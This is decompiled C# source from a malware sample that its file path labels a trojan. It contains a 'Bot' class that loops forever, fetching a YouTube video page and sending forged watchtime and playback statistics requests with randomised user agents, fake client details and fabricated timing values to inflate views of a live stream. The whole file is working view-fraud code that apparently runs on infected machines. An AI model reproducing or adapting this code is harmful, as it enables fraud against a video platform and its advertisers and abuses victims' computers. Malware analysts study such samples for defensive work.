// Decompiled with JetBrains decompiler
// Type: LiveEngine.Requests.Bot
// Assembly: LiveEngine, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 613A71CB-57CC-49C5-976F-14458959D4C9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bingoml.gen-8ecc2a19dcbcfe3f7f6e749dca526d6f1c0d277f95a9c2b8df6f81fe3d1a1d1f.exe

using Leaf.xNet;
using LiveEngine.Helpers;
using LiveEngine.Settings;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Threading;
using System.Web;

namespace LiveEngine.Requests
{
  internal class Bot
  {
    public static void Worker()
    {
      while (true)
      {
        Thread.Sleep(30000);
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            Random random = new Random();
            CookieStorage cookieStorage = new CookieStorage(false, (CookieContainer) null, false);
            httpRequest.UserAgentRandomize();
            string input = ((object) httpRequest.Get("https://www.youtube.com/watch?v=" + Info.VideoID, (RequestParams) null)).ToString();
            NameValueCollection queryString = HttpUtility.ParseQueryString(RegularExpressions.ViewUrl.Match(input).Groups[1].Value.Replace("\\u0026", "&").Replace("%2C", ",").Replace("\\/", "/"));
            string str1 = queryString.Get(queryString.AllKeys[0]);
            string str2 = queryString.Get("ei");
            string str3 = queryString.Get("of");
            string str4 = queryString.Get("vm");
            string cpn = Bot.GetCPN();
            DateTime utcNow = DateTime.UtcNow;
            int num1 = Info.Rnd.Next(1000, 10000);
            double cmt = Bot.GetCmt(utcNow);
            double lio = Bot.GetLio(utcNow);
            int num2 = Info.Rnd.Next(10, 200);
            int num3 = Info.Rnd.Next(1000, 8000);
            int num4 = num2 + 300;
            string str5 = Bot.BuildUrl(new Dictionary<string, string>()
            {
              ["ns"] = "yt",
              ["el"] = "detailpage",
              ["cpn"] = cpn,
              ["docid"] = Info.VideoID,
              ["ver"] = "2",
              ["cmt"] = cmt.ToString(),
              ["ei"] = str2,
              ["fmt"] = "243",
              ["fs"] = "0",
              ["rt"] = num2.ToString(),
              ["of"] = str3,
              ["euri"] = "",
              ["lact"] = num3.ToString(),
              ["live"] = "dvr",
              ["cl"] = str1,
              ["state"] = "playing",
              ["vm"] = str4,
              ["volume"] = "100",
              ["cbr"] = "Firefox",
              ["cbrver"] = "83.0",
              ["c"] = "WEB",
              ["cplayer"] = "UNIPLAYER",
              ["cver"] = "2.20201210.01.00",
              ["cos"] = "Windows",
              ["cosver"] = "10.0",
              ["cplatform"] = "DESKTOP",
              ["delay"] = "5",
              ["hl"] = "en_US",
              ["rtn"] = num4.ToString(),
              ["aftm"] = "140",
              ["rti"] = num2.ToString(),
              ["muted"] = "0",
              ["st"] = num1.ToString(),
              ["et"] = cmt.ToString(),
              ["lio"] = lio.ToString()
            });
            httpRequest.AcceptEncoding = "gzip, deflate";
            httpRequest.AddHeader("Host", "www.youtube.com");
            httpRequest.Get(str5.Replace("watchtime", "playback"), (RequestParams) null);
            httpRequest.AcceptEncoding = "gzip, deflate";
            httpRequest.AddHeader("Host", "www.youtube.com");
            httpRequest.Get(str5, (RequestParams) null);
          }
        }
        catch
        {
        }
      }
    }

    public static string BuildUrl(Dictionary<string, string> args)
    {
      string str = "https://s.youtube.com/api/stats/watchtime?";
      foreach (KeyValuePair<string, string> keyValuePair in args)
        str = str + keyValuePair.Key + "=" + keyValuePair.Value + "&";
      return str;
    }

    public static double GetCmt(DateTime date)
    {
      DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
      TimeSpan timeSpan = date.ToUniversalTime() - dateTime;
      return double.Parse(((DateTime.UtcNow.ToUniversalTime() - dateTime).TotalSeconds - timeSpan.TotalSeconds).ToString("#.000"));
    }

    public static double GetLio(DateTime date)
    {
      DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
      return double.Parse((date.ToUniversalTime() - dateTime).TotalSeconds.ToString("#.000"));
    }

    public static string GetCPN() => new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_", 16).Select<string, char>((Func<string, char>) (s => s[Info.Rnd.Next(s.Length)])).ToArray<char>());
  }
}
